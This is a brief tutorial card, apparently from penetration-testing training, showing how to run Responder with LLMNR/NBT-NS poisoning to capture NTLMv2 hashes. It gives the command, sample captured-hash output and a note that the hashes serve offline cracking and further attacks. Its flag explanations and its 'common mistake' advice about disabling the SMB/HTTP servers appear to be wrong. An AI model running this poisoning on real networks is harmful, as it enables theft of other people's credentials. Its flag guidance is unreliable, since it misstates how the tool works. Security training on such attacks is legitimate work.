Using Responder to Capture Hashes

Setting up Responder and observing captured NTLMv2 hashes

Responder Command Example

# Start Responder on interface eth0 with LLMNR/NBT-NS poisoning and verbose output
sudo responder -I eth0 -rPv

# Expected output when a hash is captured:
[SMB] NTLMv2-SSP Hash Captured - USER::DOMAIN::WORKSTATION::HASH
Key Takeaway

Successfully running Responder allows you to capture NTLMv2 hashes, which are critical for offline cracking and further authentication attacks.

Responder Flags Explained

  • •-I <interface>: Specifies the network interface to listen on (e.g., eth0, tun0).
  • •-r: Enables LLMNR poisoning.
  • •-P: Enables NBT-NS poisoning.
  • •-v: Enables verbose output, showing more details during operation.
Common Mistake

Forgetting to disable Responder's built-in SMB/HTTP servers if you only want to capture hashes. This can interfere with other tools or alert defenses.
